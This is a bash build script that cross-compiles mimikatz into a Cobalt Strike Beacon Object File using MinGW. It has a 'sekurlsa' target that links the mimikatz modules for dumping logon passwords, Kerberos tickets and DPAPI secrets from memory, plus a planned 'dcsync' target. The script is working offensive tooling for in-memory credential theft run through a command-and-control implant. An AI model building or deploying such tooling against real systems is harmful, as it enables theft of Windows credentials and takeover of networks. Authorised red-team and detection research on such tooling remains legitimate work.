#!/usr/bin/env bash
# build.sh — cross-compile mimikatz → Cobalt Strike BOF with MinGW.
#
# Usage: ./build.sh [test|sekurlsa|dcsync]
set -euo pipefail

M="x86_64-w64-mingw32"
CC="${M}-gcc"; LD="${M}-ld"; OBJCOPY="${M}-objcopy"

BIN_DIR="$(cd "$(dirname "$0")" && pwd)"
MIK="$BIN_DIR/.."
OUT="$BIN_DIR/obj"; mkdir -p "$OUT"

CFLAGS=(
  -c -Os -fcommon -fno-stack-protector -fno-asynchronous-unwind-tables
  -mno-stack-arg-probe -ffreestanding -std=gnu17 -w
  -Wno-error=incompatible-pointer-types -Wno-error=int-conversion
  -Wno-error=implicit-function-declaration
  -DUNICODE -D_UNICODE -D_WIN64 -D_WIN32_WINNT=0x0603
  -include "$BIN_DIR/bof_compat.h"
  -include "$BIN_DIR/bof_dfr.h"
  -I"$BIN_DIR/casefix" -I"$MIK/inc" -I"$MIK/modules" -I"$MIK/mimikatz/modules" -I"$BIN_DIR"
)

cc() { "$CC" "${CFLAGS[@]}" -o "$2" "$1" && echo "  [cc] $(basename "$1")"; }

#  --strip-unneeded on a `ld -r` output deletes defined-global symbols whose refs
#  are only intra-object (e.g. crt_shim's _vscwprintf, called only from
#  bof_output.o). ld -r leaves the reloc as a symbol-table-indexed external ref;
#  once objcopy drops the symbol, the COFF loader sees an unresolved external
#  and routes it through DFR ("Symbol not found: _vscwprintf"). --strip-debug
#  removes debug info only and keeps the symbol table intact.
link() { local out="$1"; shift; "$LD" -r -o "$out" "$@"; "$OBJCOPY" --strip-debug "$out" 2>/dev/null || true; echo "  [ld] $out"; }

# ---- shared shim objects (always built) -------------------------------
SHIMS=("$OUT/crt_shim.o" "$OUT/bof_output.o" "$OUT/go_common.o" "$OUT/stubs.o" "$OUT/bof_resolve.o" "$OUT/bof_globals.o")

echo "== shims =="
cc "$BIN_DIR/crt_shim.c"     "$OUT/crt_shim.o"
cc "$BIN_DIR/bof_output.c"   "$OUT/bof_output.o"
cc "$BIN_DIR/go_common.c"    "$OUT/go_common.o"
cc "$BIN_DIR/stubs.c"        "$OUT/stubs.o"
cc "$BIN_DIR/bof_resolve.c"  "$OUT/bof_resolve.o"
cc "$BIN_DIR/bof_globals.c"  "$OUT/bof_globals.o"

case "${1:-test}" in
  test)
    echo "== test_bof =="
    cc "$BIN_DIR/test_bof.c" "$OUT/test_bof.o"
    link "$BIN_DIR/test_bof.o" "$OUT/test_bof.o"
    ;;

  sekurlsa)
    echo "== sekurlsa (logonpasswords) =="
    cc "$BIN_DIR/sekurlsa_bof.c" "$OUT/sekurlsa_bof.o"
    TUS=(
      kull_m_process kull_m_memory kull_m_crypto kull_m_patch kull_m_file
      kull_m_token kull_m_net kull_m_ldap kull_m_handle kull_m_registry
      kull_m_service kull_m_pipe kull_m_remotelib kull_m_asn1 kull_m_cred
      kull_m_key kull_m_dpapi kull_m_string kull_m_minidump kull_m_kernel
      kull_m_crypto_sk
      kuhl_m_sekurlsa kuhl_m_sekurlsa_utils kuhl_m_sekurlsa_sk
      kuhl_m_sekurlsa_nt5 kuhl_m_sekurlsa_nt6
      kuhl_m_sekurlsa_msv1_0 kuhl_m_sekurlsa_wdigest kuhl_m_sekurlsa_kerberos
      kuhl_m_sekurlsa_tspkg kuhl_m_sekurlsa_livessp kuhl_m_sekurlsa_ssp
      kuhl_m_sekurlsa_dpapi kuhl_m_sekurlsa_credman kuhl_m_sekurlsa_cloudap
      kuhl_m_kerberos_ticket kuhl_m_dpapi_oe
      kull_m_rpc kull_m_rpc_ms-credentialkeys kull_m_rpc_dpapi-entries
    )
    SRCS=(
      modules/kull_m_process.c modules/kull_m_memory.c modules/kull_m_crypto.c
      modules/kull_m_patch.c modules/kull_m_file.c modules/kull_m_token.c
      modules/kull_m_net.c modules/kull_m_ldap.c modules/kull_m_handle.c
      modules/kull_m_registry.c modules/kull_m_service.c modules/kull_m_pipe.c
      modules/kull_m_remotelib.c modules/kull_m_asn1.c modules/kull_m_cred.c
      modules/kull_m_key.c modules/kull_m_dpapi.c modules/kull_m_string.c
      modules/kull_m_minidump.c modules/kull_m_kernel.c modules/kull_m_crypto_sk.c
      mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
      mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
      mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_sk.c
      mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt5.c
      mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
      mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c
      mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c
      mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c
      mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_tspkg.c
      mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_livessp.c
      mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_ssp.c
      mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_dpapi.c
      mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_credman.c
      mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_cloudap.c
      mimikatz/modules/kerberos/kuhl_m_kerberos_ticket.c
      mimikatz/modules/dpapi/kuhl_m_dpapi_oe.c
      modules/rpc/kull_m_rpc.c modules/rpc/kull_m_rpc_ms-credentialkeys.c
      modules/rpc/kull_m_rpc_dpapi-entries.c
    )
    for i in "${!TUS[@]}"; do
      cc "$MIK/${SRCS[$i]}" "$OUT/${TUS[$i]}.o"
    done
    OBJS=("${SHIMS[@]}" "$OUT/sekurlsa_bof.o")
    for t in "${TUS[@]}"; do OBJS+=("$OUT/$t.o"); done
    link "$BIN_DIR/sekurlsa_bof.o" "${OBJS[@]}"
    echo "  -> sekurlsa_bof.o ($(stat -c%s "$BIN_DIR/sekurlsa_bof.o") bytes)"
    ;;

  dcsync)
    echo "== dcsync (Phase 3, not wired yet) =="
    exit 1
    ;;
esac

echo "== done =="
